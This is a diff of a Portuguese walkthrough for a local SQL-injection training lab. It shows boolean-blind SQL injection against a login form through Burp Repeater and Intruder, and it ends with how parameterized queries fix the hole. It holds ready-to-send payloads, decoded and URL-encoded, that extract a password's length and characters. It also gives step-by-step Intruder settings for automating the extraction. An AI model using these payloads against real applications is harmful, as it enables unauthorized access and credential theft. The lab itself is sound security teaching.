@@ -30,9 +30,13 @@ row = conn.execute(query).fetchone()
 
 Então o atacante tem a mesma capacidade de injeção mas um canal de exfil bem mais estreito: um único bit por request. O resto deste walkthrough é sobre como esse bit, usado com cuidado, ainda extrai a senha.
 
-## 3. Exploração via Burp Suite (trilha principal)
+## 3. Exploração via Burp Suite
 
-Configure o Burp Proxy e aponte o browser pra ele. Visite <http://127.0.0.1:8006/>, faça login com `alice / wonderland` uma vez pra capturar o tráfego, depois clique com o botão direito no request `POST /login` em **Proxy → HTTP history** e escolha **Send to Repeater**.
+Este átomo é trabalhado inteiramente no Burp Suite (Proxy → Repeater → Intruder). A interface web existe apenas como destino legítimo das requests — todos os passos abaixo acontecem no Burp.
+
+O form de login em `/` dispara um `POST /login` com body form-encoded `username=<...>&password=<...>`. Monte esse request numa nova aba do Repeater apontando pra `127.0.0.1:8006` e mande uma vez com as credenciais do seed (`username=alice&password=wonderland`): o body da response volta com `<h1>Welcome, alice!</h1>`, seu baseline pro estado de sucesso. Cada passo abaixo edita o body e reenvia.
+
+> **Convenção de notação.** Letras maiúsculas isoladas em payloads (`N`, `P`, `C`) são *placeholders de leitura* — substitua por um valor concreto antes de enviar a request. Mandar a letra literal causa erro 500 (SQLite tenta resolver como nome de coluna).
 
 ### Uma nota sobre encoding do body
 
@@ -152,19 +156,26 @@ Qualquer condição booleana que você consiga expressar em SQL pode agora ser r
 
 ### Passo 4 — Extrair o comprimento da senha
 
-Sai de "demonstrar o oracle" e entra em *usar* ele. Embute uma subquery que pergunta algo concreto sobre dado real:
+Sai de "demonstrar o oracle" e entra em *usar* ele. Embute uma subquery que pergunta algo concreto sobre dado real — aqui, se o comprimento da senha da alice é igual a algum número N. Comece com um request concreto que testa se o comprimento é 5:
 
-Body (decoded, N variável):
+Body (decoded):
 
 ```
-username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = N --&password=x
+username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = 5 --&password=x
 ```
 
-Pra cada valor de N que você testa, a subquery retorna o comprimento real da senha da alice, a comparação é verdadeira só quando N casa, e o oracle pisca de acordo. Rode manualmente algumas vezes no Repeater:
+Body (Burp-ready):
 
-- `N = 5` → `Invalid credentials.`
-- `N = 10` → `Welcome, alice!`
-- `N = 15` → `Invalid credentials.`
+```
+username=nobody%27%20OR%20(SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%205%20--&password=x
+```
+
+Mande. Response: `Invalid credentials.` — o comprimento não é 5.
+
+Agora itere o número no mesmo lugar (no Repeater, edita só o `5`):
+
+- `... = 10 ...` → `Welcome, alice!`
+- `... = 15 ...` → `Invalid credentials.`
 
 Conclusão: a senha da alice tem 10 caracteres. Você descobriu um fato sobre um dado que não consegue ler diretamente, lendo um bit por request.
 
@@ -172,56 +183,73 @@ Um atacante real automatizaria isso com Intruder (uma posição, payload set `Nu
 
 ### Passo 5 — Extrair caracteres e automatizar com Burp Intruder
 
-Mesmo truque, pergunta mais fina. Em vez de perguntar "o comprimento é N?", pergunta "o caractere na posição P é igual a C?".
+Mesmo truque, uma pergunta mais fina. Em vez de perguntar "o comprimento é N?", pergunta "o caractere na posição P é igual ao candidato C?". `SUBSTR(password, P, 1)` extrai um caractere da senha, e a comparação transforma ele no único bit que o oracle revela.
 
-Body (decoded, P = posição, C = caractere candidato):
+**A — Sondar o primeiro caractere no Repeater**
+
+Antes de automatizar, valide a técnica na mão. Payload concreto testando se o primeiro caractere é `a`:
+
+Body (decoded):
 
 ```
-username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),P,1) = 'C' --&password=x
+username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'a' --&password=x
 ```
 
-Demonstre o primeiro caractere na mão no Repeater. Substitua P=1 e teste um candidato:
+Body (Burp-ready):
 
-- P=1, C=`a` → `Invalid credentials.`
-- P=1, C=`w` → `Welcome, alice!` → o primeiro caractere é `w`.
+```
+username=nobody%27%20OR%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27a%27%20--&password=x
+```
 
-Fazer isso na mão pra todas as 10 posições × 26 letras seria 260 requests. É pra isso que existe o Intruder.
+Mande. Response: `Invalid credentials.` — o primeiro caractere não é `a`.
 
-**Configure o Intruder** (os passos abaixo usam nomes de menu do Burp Community; no Pro são idênticos):
+Troca `'a'` por `'w'`, mesma request, manda de novo. Response: `<h1>Welcome, alice!</h1>` — o primeiro caractere é `w`.
 
-1. **Send to Intruder.** Clique com botão direito no request que funcionou no Repeater e escolha **Send to Intruder**. Vá pra aba Intruder.
-2. **Marque duas payload positions** no body do request com `§...§`:
-   - O `1` dentro de `,1,` (a posição P).
-   - O `'w'` que você acabou de usar (o candidato C). Marque só a letra, não as aspas em volta.
+Os dois argumentos numéricos do `SUBSTR` têm papéis distintos, e a distinção importa pro próximo passo. O primeiro (`1`) é a *posição* — qual caractere ler, o que você varia pra varrer a senha inteira. O segundo (`1`) é o *tamanho* — quantos caracteres ler, sempre 1, um char por vez.
 
-   O body deve ficar assim:
+**B — Automatizar com Burp Intruder**
+
+Fazer isso na mão pra todas as 10 posições × 26 letras seria 260 requests. É pra isso que existe o Intruder. (Os nomes de menu abaixo são do Burp Community Edition; no Pro são idênticos.)
+
+1. **Send to Intruder.** Clique com o botão direito no request que funcionou no Repeater, escolha **Send to Intruder** e vá pra aba Intruder. O request base no editor de **Positions**, antes de marcar qualquer coisa, é:
+
+   ```
+   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w' --&password=x
+   ```
+
+2. **Marque duas payload positions** com `§...§`:
+   - O **primeiro `1`** — o argumento de posição do `SUBSTR`, entre `'alice'),` e `,1)`. Esse varia de `1` a `10`.
+   - O **`w`** entre as aspas simples — o caractere candidato. Esse varia de `a` a `z`. Marque só a letra, não as aspas.
+
+   O resultado no editor:
 
    ```
    username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§' --&password=x
    ```
 
-3. **Attack type:** `Cluster bomb`. Itera o produto cartesiano dos dois payload sets — toda posição combinada com todo candidato.
-4. **Payload set 1 (a posição `§1§`):** type `Numbers`, de `1` a `10`, step `1`.
-5. **Payload set 2 (o candidato `§w§`):** type `Brute forcer`, character set `abcdefghijklmnopqrstuvwxyz`, length `1`. (O seed usa só letras minúsculas — um atacante real tipicamente ampliaria pra `[a-zA-Z0-9]` ou printable ASCII e aceitaria mais requests.)
-6. **Grep — Match.** Em **Settings** dentro da aba do Intruder (ou **Options** em versões mais antigas do Burp), encontre a seção **Grep — Match** e adicione a string literal `Welcome, alice!`. Quando o ataque rodar, o Intruder vai mostrar uma coluna de checkbox em cada request — exatamente o oracle binário, exposto como uma coluna ordenável.
-7. **Start attack.** Com 10 posições × 26 letras = 260 requests, o ataque termina em segundos contra uma app local.
+   **Não marque o segundo `1`** — o argumento de tamanho do `SUBSTR`, que fica fixo em 1. Os dois argumentos são um `1` literal no payload base, então é fácil pegar o errado. Se marcar o tamanho em vez da posição, a leitura fica presa na posição 1: o sweep passa a perguntar se os *primeiros N caracteres* são iguais a uma única letra candidata — só o caso `N = 1` pode ser verdadeiro, então você revela a primeira letra e nunca passa dela.
 
-Ordene os resultados pela coluna `Welcome, alice!`. Você fica com 10 matches, um por posição. Lê eles em ordem de posição:
+3. **Attack type:** `Cluster bomb` — itera o produto cartesiano dos dois payload sets, toda posição combinada com todo candidato.
 
-```
-1: w
-2: o
-3: n
-4: d
-5: e
-6: r
-7: l
-8: a
-9: n
-10: d
-```
+4. **Payload set 1 (a posição):**
+   - Type: `Numbers`
+   - From `1`, To `10`, Step `1`
+   - Payload count: 10
 
-Concatenado: `wonderland`. Essa é a senha armazenada da alice, recuperada sem ela jamais aparecer em uma única response body.
+5. **Payload set 2 (o candidato):**
+   - Type: `Simple list`
+   - Cole as 26 letras minúsculas, uma por linha (`a`, `b`, `c`, ..., `z`)
+   - Payload count: 26
+
+   **Não use `Brute forcer`** mesmo que pareça o encaixe óbvio. O Brute forcer com o charset `[a-z]` e Max length maior que 1 — o default na maioria das versões do Burp — gera 26⁴ = 456.976 payloads em vez de 26. O `Simple list` é determinístico: gera exatamente o que está na lista.
+
+   Confirme antes de rodar — **Request count: 260** (10 × 26).
+
+6. **Grep — Match.** Em **Settings** dentro da aba do Intruder (ou **Options** em versões mais antigas do Burp), encontre **Grep — Match** e adicione a string literal `Welcome, alice!`. Quando o ataque rodar, o Intruder mostra uma coluna de checkbox por request — o oracle binário, exposto como uma coluna ordenável.
+
+7. **Start attack.** Ordene a tabela de resultados pela coluna `Welcome, alice!`, decrescente. Os 10 hits revelam, em ordem de posição, as letras `w`, `o`, `n`, `d`, `e`, `r`, `l`, `a`, `n`, `d` → `wonderland`.
+
+Essa é a senha armazenada da alice, recuperada sem ela jamais aparecer em uma única response body.
 
 ### Por que isso é "blind" — contraste explícito com sqli-union-basic
 
@@ -233,19 +261,7 @@ Aqui não há canal de dado. O body tem exatamente duas formas: `Welcome` ou `In
 
 Uma nota de mundo real enquanto estamos no assunto: apps de verdade armazenam senhas como hash, não em texto puro. A técnica blind acima funciona do mesmo jeito contra uma coluna de hash — você estaria extraindo `$2b$12$...` em vez de `wonderland`, o que leva bem mais requests (charset mais largo e string mais longa). A técnica é o que generaliza; a coluna que você está lendo é detalhe deste lab específico.
 
-## 4. Exploração via browser (trilha secundária, opcional)
-
-Os passos 1, 2 e 3 são práticos de rodar pelo browser se você ainda não tem o Burp configurado — abra <http://127.0.0.1:8006/>, cole a forma *decoded* de cada payload no campo username, digite qualquer coisa no password, submeta, leia a página resultante:
-
-1. `alice' --` → `Welcome, alice!`
-2. `nobody' OR '1'='1` (quebrado) → `Invalid credentials.`; depois `nobody' OR '1'='1' --` (consertado) → `Welcome, alice!`
-3. `nobody' OR 1=2 --` → `Invalid credentials.`
-
-Use essa trilha pra primeira leitura, pra *sentir* o oracle piscando entre os dois estados com seus próprios cliques.
-
-A partir do Passo 4, o browser para de ser prático. O Passo 4 te faz iterar um número contra o mesmo payload, e o Passo 5 precisa de centenas de requests espalhados em duas payload positions — isso é trabalho de Repeater e Intruder. Passe pro Burp depois que o oracle clicar.
-
-## 5. Por que o fix funciona
+## 4. Por que o fix funciona
 
 Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. Com placeholders, o driver do SQLite faz o parse do statement primeiro — sem os valores dos parâmetros — e só depois liga cada input como valor literal dentro do statement já parseado. Nenhum caractere de nenhum dos dois inputs consegue deslocar o parse: `'`, `--`, `OR`, `SELECT`, parênteses, newlines, tudo permanece nos seus respectivos slots de string literal e nunca é reinterpretado como sintaxe SQL.
 
